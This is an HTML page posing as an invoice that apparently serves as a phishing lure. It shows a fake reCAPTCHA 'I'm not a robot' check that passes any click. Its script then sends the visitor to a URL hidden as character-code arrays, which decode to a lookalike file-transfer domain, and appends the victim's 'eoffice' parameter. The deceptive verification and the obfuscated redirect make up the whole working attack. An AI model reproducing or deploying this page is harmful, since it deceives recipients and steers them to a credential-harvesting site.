<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Invoice</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>ðŸ“„</text></svg>">
  
  <style>
    body {
      font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
      background: linear-gradient(to bottom right, #f0f2f5, #e1e5eb);
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
    }
    
    .loader-container {
      position: absolute;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    .loader {
      width: 120px;
      height: 120px;
      animation: pulse 2.5s ease-in-out infinite;
      filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
    }
    
    @keyframes pulse {
      0%, 100% {
        transform: scale(1);
        opacity: 0.85;
      }
      50% {
        transform: scale(1.15);
        opacity: 1;
      }
    }
    
    .verification-container {
      display: none;
      max-width: 320px;
      width: 90%;
      text-align: center;
    }
    
    .verification-message {
      margin-bottom: 16px;
      color: #333;
      font-size: 16px;
    }
    
    .verification-box {
      background: #fff;
      border-radius: 8px;
      padding: 16px;
      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
    }
    
    .verification-checkbox {
      display: flex;
      align-items: center;
      padding: 8px;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    
    .verification-checkbox:hover {
      background-color: #f5f5f5;
    }
    
    .checkbox {
      width: 20px;
      height: 20px;
      border: 2px solid #5f6368;
      border-radius: 4px;
      margin-right: 12px;
      position: relative;
      transition: all 0.3s ease;
    }
    
    .checkbox-icon {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 14px;
      display: none;
    }
    
    .checkbox-label {
      font-weight: 500;
      color: #202124;
      flex-grow: 1;
      text-align: left;
      font-size: 14px;
    }
    
    .checkbox-footer {
      display: flex;
      flex-direction: column;
      align-items: flex-end;
      margin-left: 8px;
    }
    
    .recaptcha-logo {
      width: 28px;
      height: 28px;
    }
    
    .footer-links {
      font-size: 9px;
      margin-top: 4px;
      color: #5f6368;
    }
    
    .footer-links a {
      color: inherit;
      text-decoration: none;
    }
    
    .footer-links a:hover {
      text-decoration: underline;
    }
    
    .footer-links span {
      color: #dadce0;
      margin: 0 4px;
    }
    
    /* States */
    .loading .checkbox {
      border-color: transparent;
      background-color: transparent;
    }
    
    .verified .checkbox {
      background-color: #34a853;
      border-color: #34a853;
    }
    
    .verified .checkbox-icon {
      display: block;
    }
  </style>
</head>
<body>
  <div class="loader-container" id="loader">
    <img src="logo.png" class="loader" alt="Loading document">
  </div>

  <div class="verification-container" id="verificationPanel">
    <p class="verification-message">To view this document, please verify you're not a robot below</p>
    
    <div class="verification-box">
      <div class="verification-checkbox" id="verificationCheckbox">
        <div class="checkbox">
          <svg viewBox="0 0 24 24" class="checkbox-icon" fill="white">
            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
          </svg>
        </div>
        <span class="checkbox-label">I'm not a robot</span>
        <div class="checkbox-footer">
          <svg viewBox="0 0 122.88 116.79" class="recaptcha-logo">
            <path fill="#1C3AA9" d="M101.42,40.78c0-0.59-0.02-1.17-0.04-1.75V5.88l-9.16,9.17C84.72,5.86,73.31,0,60.53,0 c-13.3,0-25.12,6.35-32.59,16.18l15.02,15.18c1.47-2.72,3.56-5.06,6.08-6.83c2.62-2.05,6.34-3.72,11.48-3.72 c0.62,0,1.1,0.07,1.45,0.21c6.37,0.5,11.89,4.02,15.14,9.12L66.48,40.77C79.95,40.72,95.17,40.69,101.42,40.78L101.42,40.78 L101.42,40.78z M101.42,40.78L101.42,40.78L101.42,40.78L101.42,40.78z"/>
            <path fill="#4285F4" d="M60.29,0c-0.59,0-1.17,0.02-1.75,0.04H25.38l9.17,9.16C25.37,16.71,19.5,28.12,19.5,40.9 c0,13.3,6.35,25.12,16.18,32.59l15.18-15.02c-2.72-1.47-5.06-3.56-6.83-6.08c-2.05-2.62-3.72-6.34-3.72-11.48 c0-0.62,0.07-1.1,0.21-1.45c0.5-6.37,4.02-11.89,9.12-15.14l10.63,10.63C60.23,21.47,60.19,6.26,60.29,0L60.29,0L60.29,0z M60.29,0 L60.29,0L60.29,0L60.29,0z"/>
            <path fill="#ABABAB" d="M19.51,40.9c0,0.59,0.02,1.17,0.04,1.75V75.8l9.16-9.16c7.5,9.18,18.91,15.04,31.69,15.04 c13.3,0,25.12-6.35,32.59-16.18L77.97,50.32c-1.47,2.72-3.56,5.06-6.08,6.83c-2.62,2.05-6.34,3.72-11.48,3.72 c-0.62,0-1.1-0.07-1.45-0.21c-6.37-0.5-11.89-4.02-15.14-9.12l10.63-10.63C40.98,40.96,25.76,40.99,19.51,40.9L19.51,40.9 L19.51,40.9z M19.51,40.9L19.51,40.9L19.51,40.9L19.51,40.9z"/>
          </svg>
          <div class="footer-links">
            <a href="#">Privacy</a>
            <span>â€¢</span>
            <a href="#">Terms</a>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const loader = document.getElementById('loader');
      const verificationPanel = document.getElementById('verificationPanel');
      const verificationCheckbox = document.getElementById('verificationCheckbox');
      const checkbox = verificationCheckbox.querySelector('.checkbox');
      const checkboxIcon = checkbox.querySelector('.checkbox-icon');
      let isVerified = false;
      
      // Show verification panel after loading delay
      setTimeout(() => {
        loader.style.display = 'none';
        verificationPanel.style.display = 'block';
      }, 2500);
      
      verificationCheckbox.addEventListener('click', function() {
        if (isVerified) return;
        
        // Show loading state
        this.classList.add('loading');
        
        setTimeout(() => {
          // Show verified state
          this.classList.remove('loading');
          this.classList.add('verified');
          checkboxIcon.style.display = 'block';
          isVerified = true;
          
          // Redirect after verification
          setTimeout(redirectAfterVerification, 1000);
        }, 1500);
      });
      
      function redirectAfterVerification() {
        const urlParams = new URLSearchParams(window.location.search);
        const eofficeParam = urlParams.get('eoffice') || '';
        
        // Obfuscated URL components
        const parts = [
          String.fromCharCode(112, 114, 111, 116, 111, 110, 102, 105, 108, 101, 115),
          String.fromCharCode(101, 103, 118, 104, 102, 122, 116, 114, 97, 110, 115, 102, 101, 114, 99, 121, 103, 118),
          String.fromCharCode(111, 110, 108, 105, 110, 101),
          String.fromCharCode(47, 116, 79, 110, 68, 113, 88, 102, 81)
        ];
        
        const redirectUrl = `https://${parts[0]}.${parts[1]}.${parts[2]}${parts[3]}#${eofficeParam}`;
        window.location.href = redirectUrl;
      }
    });
  </script>
</body>
</html>
